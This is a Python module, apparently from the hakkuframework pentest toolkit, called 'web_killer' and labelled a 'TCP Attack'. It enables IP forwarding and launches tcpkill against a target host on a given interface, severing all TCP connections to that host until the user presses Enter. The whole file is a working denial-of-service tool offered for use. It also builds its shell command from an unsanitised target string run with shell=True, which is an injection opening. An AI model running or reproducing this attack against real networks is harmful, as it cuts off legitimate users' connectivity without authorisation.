# Copyright (C) 2015 – 2021 Noa-Emil Nissinen (4shadoww)

from core.hakkuframework import *
import time
import os
import subprocess
from core import colors

conf = {
    "name": "web_killer",
    "version": "1.0",
    "shortdesc": "TCP Attack",
    "author": "4shadoww",
    "github": "4shadoww",
    "email":  "4shadoww0@gmail.com",
    "initdate": "2016-02-24",
    "lastmod": "2016-12-29",
    "apisupport": False,
    "dependencies": ["dnsiff"]
}

# List of the variables
variables = OrderedDict((
    ('interface', ['wlan0', 'network interface name']),
    ('target', ['google.com', 'target address']),

))

# Simple changelog
changelog = "Version 1.0:\nrelease"

# Run
def run():
    variables['target'][0] = variables['target'][0].replace("http://", "")
    variables['target'][0] = variables['target'][0].replace("https://", "")
    print_info("IP forwarding...")
    subprocess.Popen('echo 1 > /proc/sys/net/ipv4/ip_forward', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    time.sleep(2)
    command_1 = 'tcpkill -i ' + variables['interface'][0] +' -9 host ' + variables['target'][0]
    subprocess.Popen(command_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    line_3 = colors.green + "attack has been started, for stop attack press [enter]"
    press_ak = input(line_3)
    os.system('killall tcpkill')
    print_info("attack has been stoped")
